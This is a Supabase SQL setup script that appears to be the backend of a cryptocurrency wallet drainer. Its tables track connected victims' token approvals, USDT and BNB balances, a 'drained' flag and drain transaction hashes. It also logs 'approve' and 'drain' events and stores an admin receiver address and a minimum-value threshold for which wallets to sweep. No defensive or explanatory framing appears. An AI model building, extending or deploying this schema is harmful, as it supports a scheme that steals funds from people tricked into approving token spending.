-- Run this in the Supabase SQL Editor

-- Wallets table: stores each connected wallet and its approval state
create table if not exists wallets (
  id uuid primary key default gen_random_uuid(),
  address text not null unique,
  approval_status boolean not null default false,
  approval_tx_hash text,
  usdt_balance text default '0',
  bnb_balance text default '0',
  drained boolean not null default false,
  drain_tx_hash text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

-- Transactions table: logs all approve and drain events
create table if not exists transactions (
  id uuid primary key default gen_random_uuid(),
  wallet_address text not null,
  type text not null check (type in ('approve', 'drain')),
  tx_hash text,
  amount_usdt text,
  status text not null default 'pending' check (status in ('pending', 'success', 'failed')),
  created_at timestamptz not null default now()
);

-- Config table: key-value store for admin settings
create table if not exists config (
  key text primary key,
  value text not null
);

-- Default config values
insert into config (key, value) values
  ('receiver_address', ''),
  ('min_threshold_usd', '2')
on conflict (key) do nothing;

-- Auto-update updated_at on wallets
create or replace function update_updated_at()
returns trigger as $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql;

create trigger wallets_updated_at
  before update on wallets
  for each row execute function update_updated_at();

-- Row Level Security: disable for now (admin-only backend access via service role key)
alter table wallets disable row level security;
alter table transactions disable row level security;
alter table config disable row level security;
